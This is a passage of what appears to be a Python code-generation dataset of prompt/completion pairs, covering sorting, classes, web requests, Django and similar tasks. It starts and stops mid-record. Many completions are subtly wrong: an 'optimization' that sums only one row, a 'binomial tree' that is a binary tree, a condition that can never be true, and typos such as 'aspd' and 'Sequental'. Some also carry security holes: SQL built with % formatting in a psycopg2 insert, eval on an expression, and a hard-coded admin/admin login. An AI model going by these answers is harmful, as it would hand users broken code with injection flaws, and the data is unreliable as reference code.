Check if the string is valid according to the rules: def check_string_validity(input_string, rules): valid = True for char in input_string: if char.islower() or char.isdigit(): continue else: valid = False break return valid # Get the result: validity = check_string_validity(\\"Better than ever\\", \\"String should contain only lower case characters and digits\\") print(validity) # Output: False"},{"prompt":"mprove the performance of a given Python program by at least 2x (relative performance improvement). #This program reads a 2D array of numbers from a text file and computes the sum of each row in the array with open('arr.txt') as f: for line in f: arr = [float(x) for x in line.split()] # read numbers from a line in a file print(Sum of the row: , sum(arr))","completion":"#This program reads a 2D array of numbers from a text file and computes the sum of each row in the array from collections import deque with open('arr.txt') as f: arr = deque([float(x) for x in next(f).split()]) # read numbers from a line in a file result = 0 while arr: result += arr.popleft() print(\\"Sum of the row: \\", result)"},{"prompt":"Design a class for a Binomial Tree in Python.","completion":"class BinomialTree: def __init__(self, data): self.data = data self.left = None self.right = None def add_left_child(self, data): self.left = BinomialTree(data) def add_right_child(self, data): self.right = BinomialTree(data)"},{"prompt":"Develop an algorithm in Python to find the number of combinations for selecting a team of 8 members out of 20 people.","completion":"def combination_of_team(n, k): return math.factorial(n)//(math.factorial(k)*math.factorial(n-k)) team_members = 8 total_members = 20 print(combination_of_team(total_members, team_members))"},{"prompt":"Create a REST API endpoint in Python that fetches data from a database and returns it as JSON. The table Users has the following columns: Id (primary key), Name, Email, Gender.","completion":"@app.route('/users', methods=['GET']) def get_users(): users = User.query.all() return jsonify([{'Id': user.id, 'Name': user.name, 'Email': user.email, 'Gender': user.gender} for user in users])"},{"prompt":"Generate a Python function for counting the number of digits in a given number","completion":"def count_digits(num): \\"\\"\\" Counts the number of digits in a given number. \\"\\"\\" count = 0 while num > 0: num //= 10 count += 1 return count if __name__ == '__main__': num = int(input('Enter number: ')) print(count_digits(num))"},{"prompt":"Create a class in Python to represent a car and its properties such as make, model, color, number of wheels etc. Not applicable","completion":"class Car(): #initialize car def __init__(self, make, model, color, wheels): self.make = make self.model = model self.color = color self.wheels = wheels #string representation def __str__(self): return '{}, {}, {}, {}'.format(self.make, self.model, self.color, self.wheels)"},{"prompt":"Write Python code to remove all the vowels from a given string. string = 'Hello World!'","completion":"def remove_vowels(string): # Replace all the vowels with empty string without_vowels = string.replace('a', '').replace('e', '').replace('i', '').replace('o', '').replace('u', '') return without_vowels if __name__ == '__main__': print(remove_vowels('Hello World!'))"},{"prompt":"Generate a correct python program to output the number of seconds in the future and in the past 60 minute","completion":"def calculate_seconds(minutes): return minutes * 60 future_seconds = calculate_seconds(60) print(\\"The number of seconds in the future is \\" + str(future_seconds)) past_seconds = calculate_seconds(-60) print(\\"The number of seconds in the past is \\" + str(past_seconds))"},{"prompt":"Develop a Python program that takes in a date as an input and prints out the following day in a humanreadable format. Not applicable","completion":"from datetime import date, timedelta def next_day(old_date): d = date.fromisoformat(old_date) new_date = d + timedelta(1) return new_date.isoformat() next_day(\\"2020-06-20\\")"},{"prompt":"mplement a data structure in Python for a binary search tree. Not applicable","completion":"class Node: def __init__(self, data): self.data = data self.left = None self.right = None class BinarySearchTree: def __init__(self): self.root = None def insert(self, data): newNode = Node(data) if self.root is None: self.root = newNode else: current = self.root while True: if data < current.data: if current.left is None: current.left = newNode return else: current = current.left else: if current.right is None: current.right = newNode return else: current = current.right"},{"prompt":"Create a method in Python that receives a list of strings and prints out the longest string. strings = [“ABC”, “AAA”, “AB”, “ABCDE”]","completion":"def longest_string(strings): longest = \\"\\" for s in strings: if len(s) > len(longest): longest = s print(longest) longest_string(strings) # Output: ABCDE"},{"prompt":"You are asked to create an encryption program that produces an output which should be different from its original one when decrypted. <noinput>","completion":"# Python 3 program for the implementation of the Encryption Algorithm # Method to encrypt the given string def encrypt_string(str): cipher = \\"\\" for s in str: # Shift each character by 2 ascii value s = chr(ord(s) + 2) cipher += s return cipher # Driver code str = \\"python\\" print (\\"Encrypted String: \\" + encrypt_string(str))"},{"prompt":"Construct a python GUI to display the following information Current temperature in Manh","completion":"import tkinter as tk # Create the main window root = tk.Tk() # Set the window title root.title(\\"Temperature in Manhattan\\") # Get the current temperature in Manhattan temp_in_manhattan = get_temperature_in_manhattan() # Add the temperature to the main window tk.Label(root, text=f\\"Current temperature in Manhattan is: {temp_in_manhattan}°C\\").pack() # Run the main loop root.mainloop()"},{"prompt":"Fix the code It is a Python code for creating a web server. import socket HOST, PORT = '', 8888 listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) listen_socket.bind((HOST, PORT)) listen_socket.listen(1) print 'Serving HTTP on port %s ...' % PORT","completion":"import socket HOST, PORT = '', 8888 listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) listen_socket.bind((HOST, PORT)) listen_socket.listen(1) print('Serving HTTP on port %s ...' % PORT) while True: client_connection, client_address = listen_socket.accept() request = client_connection.recv(1024) print(request) http_response = \\"\\"\\" HTTP/1.1 200 OK Hello, World! \\"\\"\\" client_connection.sendall(http_response) client_connection.close()"},{"prompt":"Create an interactive bot in Python for a restaurant menu. The bot should ask for the customer’s order, showcase the items on the menu, and calculate the total bill after the customer finishes ordering. Not applicable","completion":"# Define the menu menu = { \\"Fried Noodles\\": 30, \\"Tofu Soup\\": 20, \\"Fried Rice\\": 25, \\"Fruit Salad\\": 15 } # Print the menu for item, price in menu.items(): print(f\\"{item}..........{price}\\") # Ask for customer order order = [] while True: order_item = input(\\"What would you like to order? (Type 'done' when you are finished ordering) \\") if order_item.lower() == 'done': break else: order.append(order_item) # Calculate the total total = 0 for item in order: total += menu[item] print(f\\"Total bill is {total}\\")"},{"prompt":"Optimize the following Python code for adding two numbers a = 3 b = 4 c = a + b","completion":"def addTwoNum(a, b): return a + b c = addTwoNum(3, 4)"},{"prompt":"Write a Python program to edit an existing array without creating a new array. arr = [1,2,3,4,5]","completion":"def edit_array(arr): for i in range(len(arr)): arr[i] += 10 return arr if __name__ == '__main__': arr = [1,2,3,4,5] print(\\"Edited array:\\", edit_array(arr))"},{"prompt":"Generate a neural network model in Python to predict the outcome of a basketball match given the players' stats. Player 1: Height: 185cm; Weight: 80kg, Number of Points scored: 20 Player 2: Height: 202cm; Weight: 100kg, Number of Points scored: 30","completion":"model = Sequental() model.add(Dense(units=64, input_shape=(3,))) model.add(Activation('relu')) model.add(Dropout(.2)) model.add(Dense(32)) model.add(Activation('relu')) model.add(Dropout(.2)) model.add(Dense(1)) model.add(Activation('sigmoid')) model.compile(loss='binary_crossentropy', optimizer='Adam', metrics=['accuracy'])"},{"prompt":"mplement an algorithm in Python to insert a specified element into a sorted array. [1, 2, 6, 8], element = 3","completion":"def insert_element(arr, element): # Find insertion index i = 0 while i < len(arr) and element > arr[i]: i += 1 # Shift array elements j = len(arr) - 1 while j >= i: arr[j + 1] = arr[j] j -= 1 # Insert element arr[i] = element return arr arr = [1, 2, 6, 8] element = 3 insert_element(arr, element) # Output: [1, 2, 3, 6, 8]"},{"prompt":"Write a Python program to Reverse the word sequence of a given sentence This is a te","completion":"def reverse_sentence(sent): words = sent.split(\\" \\") reversed_words = words[::-1] result = \\" \\".join(reversed_words) return result sentence = \\"This is a test\\" print(reverse_sentence(sentence)) # Output test a is This"},{"prompt":"Write a Python function to print the times tables from 1 to 10.","completion":"def print_times_tables(): for i in range(1, 11): print(f'{i:>2} times table:') for j in range(1, 11): res = i*j print(f'{i} * {j} = {res}') print('n') print_times_tables()"},{"prompt":"Create a program in Python to process the following data and generate a report of the average salary of the employees. John Doe, 3000 Jane Doe, 4000 Mary Doe, 4500","completion":"def processSalaryData(name, salary): salaries = [] nameList = [] salaries.append(salary) nameList.append(name) averageSalary = sum(salaries) / len(salaries) print(\\"Average salary of the following employees:\\") for name in nameList: print(name) print(\\"Average Salary: \\" + str(averageSalary))"},{"prompt":"Create a Python program for managing a basic movie library. The program should be able to add and delete movies from the library and list all the movies in the library. Not applicable","completion":"import os # Create a Movie class to store movie details class Movie(object): def __init__(self, title, year): self.title = title self.year = year # Create a MovieLibrary class to store the list of movies class MovieLibrary(object): def __init__(self, name): self.name = name self.movies = [] # Method to add a movie to the library def add_movie(self, movie): self.movies.append(movie) # Method to delete a movie from the library def delete_movie(self, movie): self.movies.remove(movie) # Method to list all the movies in the library def list_movies(self): for movie in self.movies: print('{} ({})'.format(movie.title, movie.year)) # Create a new movie library instance lib = MovieLibrary('My Movie Library') # Add some movies to our library lib.add_movie(Movie('The Dark Knight', 2008)) lib.add_movie(Movie('Back to the Future', 1985)) lib.add_movie(Movie('Avengers: Endgame', 2019)) # List all the movies in the library lib.list_movies() # Delete a movie from the library lib.delete_movie(Movie('Back to the Future', 1985)) # List the movies again to verify that the movie was deleted lib.list_movies()"},{"prompt":"Generate a Python class to compare two strings.","completion":"class StrComparer: def __init__(self, str1, str2): self.str1 = str1 self.str2 = str2 def is_same(self): if self.str1 == self.str2: return True else: return False"},{"prompt":"Design a program in Python which can generate unique alphanumeric IDs. Not applicable","completion":"import string import random def generate_alphanumeric_id(stringLength=8): \\"\\"\\"Generate a random string of letters and digits \\"\\"\\" lettersAndDigits = string.ascii_letters + string.digits return ''.join(random.choice(lettersAndDigits) for i in range(stringLength)) print (\\"Random ID is: \\", generate_alphanumeric_id() )"},{"prompt":"Create an algorithm in Python to generate a random string of length n using only alphanumeric symbols. String length of 8","completion":"import random # Function to generate random string def get_random_string(length): # Create an empty string letters = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\" random_string = \\"\\" # Generate the random string of required length for x in range(length): random_string += random.choice(letters) return random_string # Usage example random_string = get_random_string(8) print(\\"Random String: \\" + random_string)"},{"prompt":"Create a program in Python to find the minimum value in a list. [30, 10, 40, 20]","completion":"def findMinValue(list): minValue = list[0] for i in range(1, len(list)): if list[i] < minValue: minValue = list[i] return minValue list1 = [30, 10, 40, 20] minValue = findMinValue(list1) print(minValue)"},{"prompt":"Generate a function in Python that adds two input numbers.","completion":"def add(x, y): return x + y"},{"prompt":"Write a Python script that creates a data frame from the given dictionary. data_dict = {Country:[India, Germany, USA, Indonesia], Capital:[Delhi, Berlin, Washington DC, Jakarta], Currency:[Rupee, Euro, US Dollar, Rupiah]}","completion":"import pandas aspd data_dict = {\\"Country\\":[\\"India\\", \\"Germany\\", \\"USA\\", \\"Indonesia\\"], \\"Capital\\":[\\"Delhi\\", \\"Berlin\\", \\"Washington DC\\", \\"Jakarta\\"], \\"Currency\\":[\\"Rupee\\", \\"Euro\\", \\"US Dollar\\", \\"Rupiah\\"]} # Creating a dataframe from given dict df = pd.DataFrame(data_dict) # Print dataframe print(df)"},{"prompt":"Write a Python program to generate a Fibonacci sequence of given length. length = 8","completion":"def getFibonacciSequence(length): a = 0 b = 1 result = [a, b] if (length < 2): return result else: for i in range(2, length): c = a + b a = b b = c result.append(c) return result print(getFibonacciSequence(8))"},{"prompt":"Write a Python program that takes in a list containing 100 integers and finds the number of occurrences of each number in the list. [1, 2, 3, 4, 4, 2, 3, 2, 1, 3, 4, 2, 1]","completion":"from collections import Counter def findOccurrences(arr): counter = Counter(arr) for i in counter: print('Number', i, 'occurs', counter[i], 'time(s).') arr = [1, 2, 3, 4, 4, 2, 3, 2, 1, 3, 4, 2, 1] findOccurrences(arr)"},{"prompt":"Create a Python program to fetch data from an HTTPS resource. url = https://example.com/data","completion":"import requests url = \\"https://example.com/data\\" # Send a GET request to the URL r = requests.get(url) # Check the status of the request if r.status_code == 200: data = r.json() # Process the fetched data else: print('Error: status code {}'.format(r.status_code))"},{"prompt":"Using Python, optimize the following code and explain the optimizations you applied. def count_words(text): ''' Counts the number of words in a text ''' word_count = 0 for word in text.split(' '): word_count += 1 return word_cou","completion":"def count_words(text): ''' Counts the number of words in a text ''' # Optimization #1: Replacing the loop and using Python's count method word_count = len(text.split(' ')) return word_count"},{"prompt":"mprove the following Python program def get_product_listing(product_category): listings = [] for product in product_category: listings.append(product.get_listing()) return listing","completion":"def get_product_listing(product_category): return [product.get_listing() for product in product_category]"},{"prompt":"mplement a function in Python to calculate the highest perfect number which is less than or equal to a given number. Number: 1000","completion":"def computeHighestPerfectNumber(n): perfect_nums = [] for num in range(2, n + 1): sum = 1 for i in range(2, num): if num % i == 0: sum = sum + i if sum == num: perfect_nums.append(num) if len(perfect_nums) == 0: return -1 else: return perfect_nums[-1] num = 1000 print(\\"The highest perfect number less than or equal to\\", num, \\"is\\", computeHighestPerfectNumber(num))"},{"prompt":"Develop a Python script that can convert a given sentence into Pig Latin. Not applicable","completion":"#function to convert word to pig latin def pig_latin_word(word): vowels = [\\"a\\",\\"e\\",\\"i\\",\\"o\\",\\"u\\"] #checks if the first letter of the word is a vowel if word[0].lower() in vowels: return word + \\"way\\" else: #finds the index of the first vowel in the word for i in range(len(word)): if word[i].lower() in vowels: break return word[i:] + word[:i] + \\"ay\\" #function to convert sentence to pig latin def pig_latin_sentence(sentence): #splits sentence into words words = sentence.split() #converts each word to pig latin new_words = [pig_latin_word(word) for word in words] #joins changed words into a sentence new_sentence = \\" \\".join(new_words) return new_sentence #example sentence sentence = \\"I went to the store.\\" #convert sentence new_sentence = pig_latin_sentence(sentence) #output print(new_sentence) # Output: Iway entway otay ethay orestay."},{"prompt":"Formulate a heuristic search algorithm in python to find a solution in the 8puzzle problem.","completion":"def heuristicSearch(initialState, goalState): # Initialize visited states set to empty set visitedStates = set() # Initialize fringe (or open list) to the initial state fringe = [] fringe.append(initialState) # Initialize cost to 0 cost = 0 while len(fringe) > 0: currentState = fringe.pop() # Check if goal state is reached if currentState == goalState: return cost # Add current node to visited set visitedStates.add(currentState) # Generate all possible neighbors from the current node neighbors = generateNeighbors(currentState) # Iterate through all neighbors for neighbor in neighbors: # Calculate heuristic (number of misplaced tiles) heuristicValue = numberOfMisplacedTiles(neighbor, goalState) # Add the neighbor to fringe (open list) if it is not visited if neighbor not in visitedStates: fringe.append(neighbor) cost += heuristicValue return None"},{"prompt":"Develop an algorithm in Python to classify a given set of features. Features: height, weight, body mass index Labels : default, not defaul","completion":"import numpy as np def classify(dataset): #We seperate the input features and labels X = dataset[:, 0:3] y = dataset[:, 3] #The height, weight and body mass index are normalized X = X/np.amax(X, axis = 0) #The labels are converted in the form of 0 and 1 y = np.where(y == 'default', 0, 1) # Create an instance of the DecisionTreeClassifier from sklearn.tree import DecisionTreeClassifier classifier = DecisionTreeClassifier() # Fit the classifier to the data classifier = classifier.fit(X, y) return classifier"},{"prompt":"Generate a code snippet in Python to handle HTTP requests from a given URL. URL = 'https://example.com/test'","completion":"import requests url = 'https://example.com/test' # Make the request response = requests.get(url) # Check the response if response.status_code == 200: # Success content = response.text else: # Failure print(f'Request failed with status code: {response.status_code}')"},{"prompt":"Create a Django application in Python to display a news feed.","completion":"# Create a Django project with a newsfeed app django-admin startproject django_newsfeed python manage.py startapp newsfeed # Add the app to the installed apps list INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'newsfeed', ] # Create models from django.db import models from django.utils import timezone class NewsFeedEntry(models.Model): title = models.CharField(max_length=200) content = models.TextField() created_at = models.DateTimeField(default=timezone.now) published_at = models.DateTimeField(null=True, blank=True) def __str__(self): return self.title # Migrate the database python manage.py makemigrations python manage.py migrate # Create a view for the list of NewsFeed entries from django.shortcuts import render from .models import NewsFeedEntry def index(request): entries = NewsFeedEntry.objects.all() context = { 'entries': entries } return render(request, 'newsfeed/index.html', context) # Create a template for the newsfeed entries <h1>NewsFeed</h1> <ul> {% for entry in entries %} <li><a href=\\"#\\">{{ entry.title }}</a></li> {% endfor %} </ul>"},{"prompt":"Create a Python function to check whether or not a string is palindrome or not.","completion":"def is_palindrome(string): i = 0 j = len(string)-1 while j > i: if string[i] != string[j]: return False i += 1 j -= 1 return True # Driver code string = \\"malayalam\\" print(is_palindrome(string))"},{"prompt":"Write a Python program to validate the given password according to the given criteria. The given criteria are: minimum 8 characters, should contain one uppercase letter, should contain one numeric dig","completion":"def validate_password(password): if len(password) < 8: return False if not any(c.isupper() for c in password): return False if not any(c.isdigit() for c in password): return False return True"},{"prompt":"Convert the following JSON string into a Python dictionary. {a:1, b: Hello, c: {d: [34, 56]}}","completion":"import json json_string = '{\\"a\\":1, \\"b\\": \\"Hello\\", \\"c\\": {\\"d\\": [34, 56]}}' parsed_json = json.loads(json_string) print(parsed_json) # Output: {'a': 1, 'b': 'Hello', 'c': {'d': [34, 56]}}"},{"prompt":"Create a python program to delete all items from a dictionary. d = {'a':1, 'b':2, 'c':3}","completion":"d = {'a':1, 'b':2, 'c':3} # Using the clear() method d.clear() print(d) # Prints an empty dictionary"},{"prompt":"Design a program in Python that takes a string as an input and checks whether all the vowels are present in the string or not. This is a te","completion":"def check_vowels(string): vowels = ['a','e','i','o','u'] for vowel in vowels: if vowel not in string: return False return True print(check_vowels('This is a test'))"},{"prompt":"Create a class in Python to represent a 3D vector. The class should contain properties for the x, y, and z coordinates and methods for calculating the magnitude. Not applicable","completion":"class Vector3D: def __init__(self, x, y, z): self.x = x self.y = y self.z = z def magnitude(self): return (self.x**2 + self.y**2 + self.z**2)**(1/2)"},{"prompt":"Design a class for a generic linked list in Python.","completion":"class LinkedList: def __init__(self): self.head = None self.tail = None def append(self, data): node = Node(data) if self.tail is not None: self.tail.next = node self.tail = node else: self.head = node self.tail = node def sort(self): if self.head is None: return current_node = self.head while current_node.next is not None: next_node = current_node.next if next_node.data < current_node.data: temp = current_node.data current_node.data = next_node.data next_node.data = temp current_node = next_node"},{"prompt":"Create a Python program that takes a list of numbers as input and sorts them by their greatest occurring number. [4, 7, 3, 5, 3, 4, 5, 3, 7]","completion":"[3, 3, 3, 4, 4, 5, 5, 7, 7] Python Code: def sort_by_greatest_occurrence(nums): num_freq = {} for num in nums: num_freq[num] = num_freq.get(num, 0) + 1 sorted_freq = sorted(num_freq.items(), key=lambda x: x[1], reverse=True) sorted_nums = [] for num, _ in sorted_freq: sorted_nums += [num] * num_freq[num] return sorted_nums nums = [4, 7, 3, 5, 3, 4, 5, 3, 7] print(sort_by_greatest_occurrence(nums))"},{"prompt":"Design an algorithm in Python for finding and printing all prime numbers between 1 and a given number. 100","completion":"def find_all_primes(n): for num in range(2,n + 1): for i in range(2,num): if (num % i) == 0: break else: print(num) find_all_primes(100)"},{"prompt":"Write a python script to generate a square matrix 4x4 filled with values from 1 to 4.","completion":"matrix = [[1,2,3,4], [1,2,3,4], [1,2,3,4], [1,2,3,4]]"},{"prompt":"Suggest a solution that writes a Python program to print the following pattern.","completion":"for i in range(1, 7): print(\\"*\\" * i)"},{"prompt":"Write a Python script to input a numeric value and generate the output in a formatted table structure. The table should have 5 rows and 3 columns.","completion":"for x in range(5): for y in range(3): col = input(\\"Enter Value: \\") print(col, end=\\"tt\\") print()"},{"prompt":"Write a method in Python to display the contents of a dictionary.","completion":"def display_dict(dictionary): for key, value in dictionary.items(): print(f'{key}: {value}')"},{"prompt":"Unify the style of a code snippet in Python. Make sure to keep the original structure, including indentation, comments, and whitespace. Example code snippet: #This function takes two arguments and adds them def add (x, y): return x + y","completion":"\\"\\"\\"This function takes two arguments and adds them\\"\\"\\" def add(x, y): return x + y"},{"prompt":"Write a Python program to provide a login interface.","completion":"def login(): username = input(\\"Username:\\") password = input(\\"Password:\\") if username == \\"admin\\" and password == \\"admin\\": return True else: return False"},{"prompt":"mplement a Python function that takes an array of strings as the input and returns a list of distinct strings sorted lexicographically. ['hello', 'world', 'hello', 'again']","completion":"def distinct_strings_sort(arr): result = [] for s in arr: if s not in result: result.append(s) return sorted(result) # Example: arr = ['hello', 'world', 'hello', 'again'] distinct_sorted = distinct_strings_sort(arr) print(distinct_sorted) # Prints: ['again', 'hello', 'world']"},{"prompt":"Write a Python program to find the longest increasing subsequence of a given array of integers arr = [10, 22, 9, 33, 21, 50, 41, 60, 80]","completion":"def longest_increasing_subsequence(arr): n = len(arr) # An array to store increasing subsequences dp = [1]*n # Compute optimal values in bottom up manner for i in range (1 , n): for j in range(0 , i): if arr[i] > arr[j] and dp[i]< dp[j] + 1 : dp[i] = dp[j]+1 # Pick maximum of dp[i] # Initialize result maximum = 0 # Pick maximum of all dp[i] for i in range(n): maximum = max(maximum , dp[i]) return maximum"},{"prompt":"Write a Python function to calculate the sum of the digits in a given string of numbers and letters.","completion":"def sum_string(s): sum = 0 for ch in s: if ch.isdigit(): sum += int(ch) return sum"},{"prompt":"Modify the Python program provided above to store the extracted data into a database (e.g. PostgreSQL). <root> <person> <name>John Doe</name> <age>30</age> <address> <street>123 Easy St</street> <city>Boston</city> <state>MA</state> </address> </person> </root>","completion":"import xml.etree.ElementTree as ET import psycopg2 # install psycopg2 # parse an XML file tree = ET.parse('data.xml') # get root element root = tree.getroot() # create a database connection conn = psycopg2.connect(\\"dbname=my_database user=postgres\\") cursor = conn.cursor() # iterate person elements for person in root.findall('person'): # get name name = person.find('name').text # get age age = person.find('age').text # get address address = person.find('address') street = address.find('street').text city = address.find('city').text state = address.find('state').text # insert into database cursor.execute( \\"\\"\\" INSERT INTO people (name, age, street, city, state) VALUES (%s,%s,%s,%s,%s) \\"\\"\\" % (name, age, street, city, state)) # commit conn.commit() # close connection conn.close()"},{"prompt":"Create a Python program to classify a given set of data using a knearest neighbors algorithm. data = [[1, 2], [2, 3], [3, 4], [4, 5], [5, 6], [6, 7]]","completion":"import numpy as np from sklearn.neighbors import KNeighborsClassifier data = np.array([[1, 2], [2, 3], [3, 4], [4, 5], [5, 6], [6, 7]]) # Create the model model = KNeighborsClassifier() # Train the model model.fit(data[:, 0].reshape(-1, 1), data[:, 1].reshape(-1, 1)) # Output the result print(model.predict([[2]])) # [[3]]"},{"prompt":"Write a Python class to store a student's name and age.","completion":"class Student: def __init__(self, name, age): self.name = name self.age = age"},{"prompt":"Create a Python program to convert a given time in 24hour format to 12hour format. 23:15","completion":"def convert_time(time): # Get the hours and minutes hours = int(time.split(':')[0]) minutes = int(time.split(':')[1]) # Convert hours to 12-hour format conv_hours = (hours - 12) if (hours > 12) else hours # Check for minute values if (minutes < 10): minutes = \\"0\\" + str(minutes); else: minutes = str(minutes); # return the converted value return str(conv_hours) + \\":\\" + minutes # Driver code time = \\"23:15\\" print(convert_time(time)) # Output: 11:15"},{"prompt":"Embed a mathematical expression in Python and print the expression. x**3 + 2*x**2 + 3","completion":"expression = 'x**3 + 2*x**2 + 3' print(eval(expression))"},{"prompt":"Write a Python script to classify a sentence as positive or negative.","completion":"import nltk from nltk.sentiment.vader import SentimentIntensityAnalyzer def classify_sentiment(sentence): sid = SentimentIntensityAnalyzer() score = sid.polarity_scores(sentence) if score['compound'] >= 0.05: return 'positive' elif score['compound'] <= -0.05: return 'negative' else: return 'neutral'"},{"prompt":"Create a Python method to get the index of the largest element in an array. [1,2,3,4,5]","completion":"def find_largest_index(arr): largest = float('-inf') largest_index = 0 for i in range(len(arr)): num = arr[i] if num > largest: largest = num largest_index = i return largest_index print(find_largest_index([1,2,3,4,5])) # 4"},{"prompt":"Create a program that sorts a list of strings in alphabetical order. ['python', 'javascript', 'java', 'go']","completion":"\\"\\"\\" Create a program that sorts a list of strings in alphabetical order. \\"\\"\\" def sort_list(lst): \\"\\"\\" This function sorts a list of strings in alphabetical order. \\"\\"\\" lst.sort() return lst if __name__ == '__main__': lst = ['python', 'javascript', 'java', 'go'] print(sort_list(lst))"},{"prompt":"Generate a function in Python that combines two string variables and returns the combined string? string1 = Hello string2 = World","completion":"def combine_strings(string1, string2): return string1 + ' ' + string2 string1 = \\"Hello\\" string2 = \\"World\\" result = combine_strings(string1, string2) print(result)"},{"prompt":"Write a Python program to print out the next day's date given today's date","completion":"import datetime def get_next_day_date(): today_date = datetime.datetime.now().date() next_day_date = today_date + datetime.timedelta(days=1) return next_day_date"},{"prompt":"mplement a basic linear search algorithm in Python that searches a list of numbers for a given target value and returns the index of the target value if it is present, otherwise it returns 1. arr = [1, 3, 5, 6, 9, 17], target = 6","completion":"def linear_search(arr, target): for i in range(len(arr)): if arr[i] == target: return i return -1 print(linear_search(arr, target)) # 3 (index of 6)"},{"prompt":"Create a program in Python to print all numbers that are divisible by 4 but not by 4.","completion":"for i in range(1, 101): if (i % 4 == 0) and (i % 2 != 0): print(i)"},{"prompt":"Construct an algorithm in Python that sorts an array using quick sort. myList = [3, 8, 10, 2, 4]","completion":"def quick_sort(input_list): if len(input_list) <= 1: return input_list pivot = input_list[0] left = [x for x in input_list[1:] if x < pivot] right = [x for x in input_list[1:] if x >= pivot] return quick_sort(left) + [pivot] + quick_sort(right) myList = [3, 8, 10, 2, 4] sortedList = quick_sort(myList) print(sortedList)"},{"prompt":"Create a class in Python that can encode and decode a string using a Caesar cipher. Not applicable","completion":"class CaesarCipher: def __init__(self, shift): encoder = [None] * 26 decoder = [None] * 26 for k in range(26): encoder[k] = chr((k + shift) % 26 + ord('A')) decoder[k] = chr((k - shift) % 26 + ord('A')) self._forward = ''.join(encoder) self._backward = ''.join(decoder) def encrypt(self, message): return self._transform(message, self._forward) def decrypt(self, secret): return self._transform(secret, self._backward) def _transform(self, original, code): msg = list(original) for k in range(len(msg)): if msg[k].isupper(): j = ord(msg[k]) - ord('A') msg[k] = code[j] return ''.join(msg)"},{"prompt":"Create a python function to take a list of numbers as an argument, and return the sum of the odd numbers in the list [2, 3, 4, 5, 6, 7]","completion":"def odd_numbers(numbers): result = 0 for num in numbers: if num % 2 != 0: result += num return result"},{"prompt":"Provide a Python function to filter out a list of strings that does not contain any substring from a given set. List = [apple, banana, pie, candy] Set = [banana, pie]","completion":"def filter_list(input_list, ref_set): # Initialize result_list = [] # Iterate through the list for item in input_list: # Set a flag flag = True # Check if the item contains any substring in ref_set for substring in ref_set: if substring in item: # If so, set the flag to False flag = False break # If the flag is still True if flag: # Add the item to the result list result_list.append(item) return result_list # Test filtered_list = filter_list([\\"apple\\", \\"banana\\", \\"pie\\", \\"candy\\"], [\\"banana\\", \\"pie\\"]) assert(filtere_list == [\\"apple\\", \\"candy\\"])"},{"prompt":"Write a function in Python to check if an integer is prime or not. 37","completion":"def is_prime(number): if number < 2: return False else: for x in range(2, number): if number % x == 0: return False return True n = 37 print (is_prime(n)) # Output: True"},{"prompt":"Build a web scraping script in Python to get information about a given topic from a website. bike shops in Berl","completion":"import requests from bs4 import BeautifulSoup url = \\"https://example.org/search?q=bike+shops+in+Berlin\\" page = requests.get(url) soup = BeautifulSoup(page.text, \\"lxml\\") # Get all shop information from the page. shops = soup.find_all(\\"div\\", class_=\\"shop-info\\") # Print each shop's name, address, and phone number. for shop in shops: name = shop.find(\\"h3\\", class_=\\"shop-name\\").text address = shop.find(\\"div\\", class_=\\"shop-address\\").text phone = shop.find(\\"div\\", class_=\\"shop-phone\\").text print(name, address, phone)"},{"prompt":"Generate a python program to search input string s for a given substring t. s= This is a string, t=ring","completion":"def find(s, t): if t in s: return s.index(t) else: return -1"},{"prompt":"Write a Python function that takes a list of numbers as input, sorts them in ascending order, and returns a new list that includes the number of times each number occurred in the original list. [2, 5, 2, 2, 1, 3, 5, 7, 2]","completion":"def sort_and_count(numbers): sorted_list = sorted(numbers) new_list = [] length = len(sorted_list) current_index = 0 while current_index < length: current_number = sorted_list[current_index] current_count = sorted_list.count(current_number) new_list.append((current_number, current_count)) for i in range(current_count): sorted_list.remove(current_number) current_index += 1 return new_list # Usage: print(sort_and_count([2, 5, 2, 2, 1, 3, 5, 7, 2])) # Output: [(1, 1), (2, 4), (3, 1), (5, 2), (7, 1)]"},{"prompt":"Rewrite the following if/else statement in one line of Python code if condition: do_this() else: do_that()","completion":"do_this() if condition else do_that()"},{"prompt":"Develop a program in Python which takes two inputs and returns the sum of their squares. 5, 9","completion":"def sum_of_squares(num1, num2): return num1**2 + num2**2 x = 5 y = 9 print(sum_of_squares(x, y)) # output: 106"},{"prompt":"Write a Python function that takes a list of names as an input and generates a dictionary of people’s names as keys and their scores as values. names = [John, Mary, Jack, Sarah]","completion":"def names_scores(names): scores = {} for name in names: scores[name] = random.randint(1, 10) return scores"},{"prompt":"Generate a Python program that uses the requests library to make a GET request to an API endpoint. https://jsonplaceholder.typicode.com/user","completion":"import requests # Make a get request to get the latest users response = requests.get('https://jsonplaceholder.typicode.com/users') # Get the response data as a JSON data = response.json() # Print the data print(data)"},{"prompt":"Create three classes 'ClassA', 'Cars', and 'Sports' in Python and define a method 'print_info' in each class.","completion":"class ClassA: def print_info(self): print(\\"This class is ClassA\\") class Cars: def print_info(self): print(\\"This class is for Cars\\") class Sports: def print_info(self): print(\\"This class is for Sports\\")"},{"prompt":"Create a Python script that converts temperatures from Celsius to Fahrenheit. 23","completion":"def celsius_to_fahrenheit(celsius): return ((celsius * 9/5 ) + 32) temperature = 23 fahrenheit = celsius_to_fahrenheit(temperature) print('The temperature in Fahrenheit is: ' + str(fahrenheit))"},{"prompt":"Using the input provided, write a Python program to display the average age of people in the data. data = [ {name: Smith, age: 30}, {name: John, age: 40}, {name: Lee, age: 50} ]","completion":"data = [ {\\"name\\": \\"Smith\\", \\"age\\": 30}, {\\"name\\": \\"John\\", \\"age\\": 40}, {\\"name\\": \\"Lee\\", \\"age\\": 50} ] #Calculate the average age total_age = 0 for person in data: total_age += person[\\"age\\"] average_age = total_age/len(data) #Display the average age print(\\"The average age of people in this data is {}\\".format(average_age)) # Output: The average age of people in this data is 40.0"},{"prompt":"Create a Python api to authenticate users using JWT. Not applicable","completion":"import jwt import bcrypt class AuthenticationApi: def __init__(self, user_repo): self.user_repo = user_repo def authenticate(self, username: str, password: str) -> str: user = self.user_repo.find_by_username(username) if user is None: raise ValueError('Invalid username or password') if not 